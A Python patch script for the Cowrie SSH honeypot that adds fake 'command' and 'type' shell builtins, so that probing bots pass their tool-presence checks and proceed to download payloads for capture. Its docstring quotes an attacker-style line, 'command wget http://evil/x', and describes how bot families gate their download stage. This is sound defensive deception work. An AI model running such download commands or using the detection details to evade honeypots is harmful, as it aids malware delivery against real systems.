#!/usr/bin/env python3
"""Patch cowrie/commands/which.py: add the `command` and `type` builtins.

WHY (measured on the arm deployment): 482 bot probes failed on
`command -v python3` / `! command -v curl` — the tool-presence gate a large
family runs BEFORE its download stage. Cowrie ships neither `command` nor
`type`, so the gate errored and the bot disengaged without dropping a payload.
The fake filesystem already contains /usr/bin/{python3,curl,wget,perl,...}, so
the tools "exist"; only the resolver was missing. Closing this gate is the
single highest-value capture fix — it lets the profiler family proceed to the
download ShardLure captures.

`which` is the natural home: same name-resolution family, already in
command_modules, so no edit to the module list.

Behaviour (byte-matched to bash):
  command -v NAME   -> resolved path (or bare NAME for a shell builtin), exit 0;
                       nothing, exit 1 if not found.
  command -V NAME   -> "NAME is /path" / "NAME is a shell builtin"; exit 1 if not.
  type NAME         -> like `command -V` (bash's `type` default).
  type -t NAME      -> "file" / "builtin"; empty + exit 1 if not found.
  command NAME ARGS -> DELEGATES to the real command via getCommand +
                       insert_command (the sudo.py pattern). Without this a bot
                       doing `command wget http://evil/x` would silently no-op
                       instead of downloading — worse for capture than the bug.
"""
import sys
from pathlib import Path

args = sys.argv[1:]
if (
    len(args) not in (1, 2)
    or not args[0]
    or args[0] == "--check"
    or (len(args) == 2 and args[1] != "--check")
):
    print(f"usage: {Path(sys.argv[0]).name} COWRIE_HOME [--check]", file=sys.stderr)
    sys.exit(2)
check_only = len(args) == 2
cowrie_home = Path(args[0])
path = str(cowrie_home / "src/cowrie/commands/which.py")
with open(path) as f:
    content = f.read()

# Anchor: the end of which.py's registry line. We append our builtins after it,
# reusing the module's existing `commands` dict and HoneyPotCommand import.
ANCHOR = 'commands["which"] = Command_which\n'

ADDITION = r'''

# --- ShardLure stealth: `command` and `type` builtins -----------------------
# See install/persona/patches/command-type-builtins.py for the why (the 482-fail
# download gate). These resolve against $PATH + the live command registry so a
# tool present in the fake FS reports as present, matching bash exactly.
from cowrie.shell.pipe import PipeProtocol  # noqa: E402


def _resolve_target(cmd, name):
    """Return (kind, display) for NAME, or (None, None) if unresolved.

    kind is "builtin" (in the command registry, no filesystem path) or "file"
    (resolved on PATH in the fake FS). display is what bash prints for the path.
    """
    # Shell builtins / registered commands with no path form. bash prints the
    # bare name for `command -v` on a builtin (e.g. `command -v cd` -> "cd").
    if cmd.protocol.getCommand(name, []) is not None and "/" not in name:
        # Distinguish "resolved via PATH" from "registered builtin": if it also
        # resolves on PATH, prefer the path form (that is what bash shows).
        for p in cmd.environ.get("PATH", "").split(":"):
            if not p:
                continue
            cand = cmd.fs.resolve_path(name, p)
            if cmd.fs.exists(cand):
                return ("file", cand)
        return ("builtin", name)
    if "/" in name:
        rp = cmd.fs.resolve_path(name, cmd.protocol.cwd)
        if cmd.fs.exists(rp):
            return ("file", rp)
        return (None, None)
    for p in cmd.environ.get("PATH", "").split(":"):
        if not p:
            continue
        cand = cmd.fs.resolve_path(name, p)
        if cmd.fs.exists(cand):
            return ("file", cand)
    return (None, None)


class Command_command(HoneyPotCommand):
    resolve_args = False

    def call(self):
        args = list(self.args)
        # `command -v NAME` / `command -V NAME`: the honeypot-detection form.
        mode = None
        while args and args[0] in ("-v", "-V", "-p"):
            opt = args.pop(0)
            if opt in ("-v", "-V"):
                mode = opt
            # -p (use default PATH) changes nothing observable here; consume it.
        if mode:
            if not args:
                self.exit_code = 1
                self.exit()
                return
            name = args[0]
            kind, disp = _resolve_target(self, name)
            if kind is None:
                # bash prints nothing for -v, a diagnostic for -V; both exit 1.
                if mode == "-V":
                    self.errorWrite(f"-bash: command: {name}: not found\n")
                self.exit_code = 1
                self.exit()
                return
            if mode == "-v":
                self.write(f"{name if kind == 'builtin' else disp}\n")
            else:  # -V
                if kind == "builtin":
                    self.write(f"{name} is a shell builtin\n")
                else:
                    self.write(f"{name} is {disp}\n")
            self.exit_code = 0
            self.exit()
            return
        # Bare `command NAME ARGS...`: run the real command so a download still
        # happens. Delegate exactly as sudo.py does.
        if not args:
            self.exit_code = 0
            self.exit()
            return
        cmdclass = self.protocol.getCommand(
            args[0], self.environ.get("PATH", "").split(":")
        )
        if cmdclass:
            newcmd = PipeProtocol(self.protocol, cmdclass, args[1:], None, None)
            self.protocol.pp.insert_command(newcmd)
            if self.input_data:
                self.writeBytes(self.input_data)
            self.exit()
        else:
            self.errorWrite(f"-bash: command: {args[0]}: not found\n")
            self.exit_code = 127
            self.exit()


class Command_type(HoneyPotCommand):
    resolve_args = False

    def call(self):
        args = list(self.args)
        type_only = False
        while args and args[0] in ("-t", "-a", "-p", "-P", "-f"):
            opt = args.pop(0)
            if opt == "-t":
                type_only = True
        if not args:
            self.exit_code = 0
            self.exit()
            return
        missing = 0
        for name in args:
            kind, disp = _resolve_target(self, name)
            if kind is None:
                if not type_only:
                    self.errorWrite(f"-bash: type: {name}: not found\n")
                missing += 1
                continue
            if type_only:
                self.write("builtin\n" if kind == "builtin" else "file\n")
            elif kind == "builtin":
                self.write(f"{name} is a shell builtin\n")
            else:
                self.write(f"{name} is {disp}\n")
        self.exit_code = 1 if missing else 0
        self.exit()


commands["command"] = Command_command
commands["type"] = Command_type
'''

if ADDITION.strip() in content:
    print(f"  [skip] {path}: already patched")
    sys.exit(0)

if content.count(ANCHOR) != 1:
    print(
        f"  [FAIL] {path}: anchor not found exactly once "
        f"(count={content.count(ANCHOR)}) — upstream which.py changed",
        file=sys.stderr,
    )
    sys.exit(1)

if check_only:
    print(f"  [check] {path}: compatible")
    sys.exit(0)

content = content.replace(ANCHOR, ANCHOR + ADDITION, 1)
with open(path, "w") as f:
    f.write(content)
print(f"  [ok] {path}: patched (command/type builtins)")
